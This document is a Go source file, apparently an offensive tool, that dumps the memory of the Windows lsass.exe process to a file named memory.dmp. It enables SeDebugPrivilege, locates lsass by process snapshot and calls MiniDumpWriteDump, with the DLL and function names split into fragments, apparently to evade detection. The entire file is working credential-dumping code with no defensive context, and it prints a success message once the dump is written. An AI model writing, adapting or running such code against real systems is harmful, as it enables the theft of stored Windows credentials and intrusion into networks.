package MiniDumpWriteDump

import (
	"golang.org/x/sys/windows"
	"log"
	"syscall"
	"unsafe"
)

/**
 * @Author: Ramoncjs
 * @Date: 2021/12/29
 **/
var _pid int

func setSeDebugPrivilege() {
	handle := windows.CurrentProcess()

	var token windows.Token
	err := windows.OpenProcessToken(handle, windows.TOKEN_ADJUST_PRIVILEGES, &token)
	if err != nil {
		log.Fatal("[-] " + err.Error())
	}

	var luid windows.LUID
	name, _ := windows.UTF16FromString("SeDebugPrivilege")
	err = windows.LookupPrivilegeValue(nil, &name[0], &luid)
	if err != nil {
		log.Fatal("[-] " + err.Error())
	}

	var tokenprivileges windows.Tokenprivileges
	tokenprivileges.PrivilegeCount = 1
	tokenprivileges.Privileges[0].Luid = luid
	tokenprivileges.Privileges[0].Attributes = 0x00000002

	err = windows.AdjustTokenPrivileges(token, false, &tokenprivileges, uint32(unsafe.Sizeof(tokenprivileges)), nil, nil)
	if err != nil {
		log.Fatal("[-] " + err.Error())
	}
}

func findPid() {
	sHandle, err := windows.CreateToolhelp32Snapshot(0x00000002, 0)
	if err != nil {
		log.Fatal("[-] " + err.Error())
	}
	defer windows.Close(sHandle)

	var entry windows.ProcessEntry32

	entry.Size = uint32(unsafe.Sizeof(entry))
	err = windows.Process32First(sHandle, &entry)
	if err != nil {
		log.Fatal("[-] " + err.Error())
	}

	for {
		_ = windows.Process32Next(sHandle, &entry)
		if windows.UTF16ToString(entry.ExeFile[:]) == "lsass.exe" {
			_pid = int(entry.ProcessID)
			break
		}
	}

}

func MiniDumpWriteDump(hProcess windows.Handle, ProcessId uint32,
	hFile windows.Handle, DumpType uint32) error {
	r1, _, lastErr := syscall.NewLazyDLL("dbgh"+"elp.dll").NewProc("MiniDum"+"pWriteDump").Call(uintptr(hProcess), uintptr(ProcessId),
		uintptr(hFile), uintptr(DumpType), uintptr(0), uintptr(0), uintptr(0))
	// If function succeed output is TRUE
	if r1 == uintptr(1) {
		return nil
	}
	return lastErr
}

func main() {
	log.Println("hello")
	findPid()
	setSeDebugPrivilege()

	pHandle, err := windows.OpenProcess(windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ, false, uint32(_pid))
	if err != nil {
		log.Fatal("[-] " + err.Error())
	}
	defer func(fd windows.Handle) {
		err := windows.Close(fd)
		if err != nil {
			log.Fatal("[-] " + err.Error())
		}
	}(pHandle)
	fileName, _ := windows.UTF16PtrFromString("memory.dmp")
	fHandle, err := windows.CreateFile(fileName, windows.GENERIC_WRITE, windows.FILE_SHARE_WRITE, nil, windows.CREATE_ALWAYS, windows.FILE_ATTRIBUTE_NORMAL, 0)
	if err != nil {
		log.Fatal("[-] " + err.Error())
	}
	defer func(fd windows.Handle) {
		err := windows.Close(fd)
		if err != nil {
			log.Fatal("[-] " + err.Error())
		}
	}(fHandle)
	err = MiniDumpWriteDump(pHandle, uint32(_pid), fHandle, 0x00000002)
	if err != nil {
		log.Fatal("[-] " + err.Error())
	}

	log.Println("[+] Dump lsass success...")
}
